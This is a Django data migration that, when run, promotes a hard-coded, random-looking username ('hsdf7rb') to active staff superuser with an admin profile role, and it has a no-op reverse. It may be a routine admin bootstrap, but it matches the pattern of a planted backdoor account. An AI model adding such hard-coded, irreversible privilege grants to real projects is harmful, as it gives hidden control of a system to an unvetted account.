from django.conf import settings
from django.db import migrations


ADMIN_USERNAME = "hsdf7rb"


def promote_admin(apps, schema_editor):
    User = apps.get_model("auth", "User")
    UserProfile = apps.get_model("platform_app", "UserProfile")

    user = User.objects.filter(username=ADMIN_USERNAME).first()
    if not user:
        return

    changed = []
    if not user.is_active:
        user.is_active = True
        changed.append("is_active")
    if not user.is_staff:
        user.is_staff = True
        changed.append("is_staff")
    if not user.is_superuser:
        user.is_superuser = True
        changed.append("is_superuser")
    if changed:
        user.save(update_fields=changed)

    profile, _ = UserProfile.objects.get_or_create(user=user)
    if profile.role != "admin":
        profile.role = "admin"
        profile.save(update_fields=["role"])


def noop_reverse(apps, schema_editor):
    pass


class Migration(migrations.Migration):
    dependencies = [
        migrations.swappable_dependency(settings.AUTH_USER_MODEL),
        ("platform_app", "0001_initial"),
        ("p0_app", "0003_rewards_notifications_admin"),
    ]

    operations = [
        migrations.RunPython(promote_admin, noop_reverse),
    ]
